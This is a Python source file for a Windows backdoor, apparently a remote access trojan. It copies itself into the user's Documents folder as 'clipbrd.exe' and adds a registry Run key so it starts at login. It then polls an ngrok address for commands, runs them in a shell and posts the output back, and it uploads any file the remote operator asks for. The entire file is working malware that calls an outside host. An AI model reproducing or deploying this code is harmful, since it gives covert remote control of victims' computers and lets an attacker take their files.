import base64
import requests
import subprocess
import time
import os
import shutil
import _winreg as wreg
import random

url = "http://c33cd106.ngrok.io"    #ngrok to reverse connection
proxy = {}


def persistence():
    path = os.getcwd().strip('\n')  # get the current working directory
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')  # Get userprofile

    # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
    destination = userprof.strip('\n\r') + '\\Documents' + '\clipbrd.exe'

    if not os.path.exists(destination):
        shutil.copyfile(path + '\clipbrd.exe', destination)
        # This is one of the keys that allows to run on startup , others can be found using
        # sysinternals tools and other methods like googling
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                           0, wreg.KEY_ALL_ACCESS)
        # Hacked is the key name that will run our backdoor on startup
        wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
        key.Close()


def sendPost(Url, Data, files=None):
    response = requests.post(url=Url, data=Data, proxies=proxy)
    return response


persistence()


def connect():
    while True:
        req = requests.get(url)
        command = req.text

        if 'terminate' in command:
            return 1

        elif 'grab' in command:
            grab, path = command.split('*')
            if os.path.exists(path):
                newUrl = url + '/store'
                files = {'file': open(path, 'rb')}
                r = sendPost(url, files=files)
            else:
                r = sendPost(url, data='[-]File Not Found')

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = sendPost(url, CMD.stdout.read())
            post_response = sendPost(url, CMD.stderr.read())

        time.sleep(3)


while True:
    try:
        if connect() == 1:
            break  # 1 is the value against terminate command

    except:
        sleep_for = random.randrange(1, 10)
        time.sleep(sleep_for)  # 1 - 10 seconds wait time
        pass
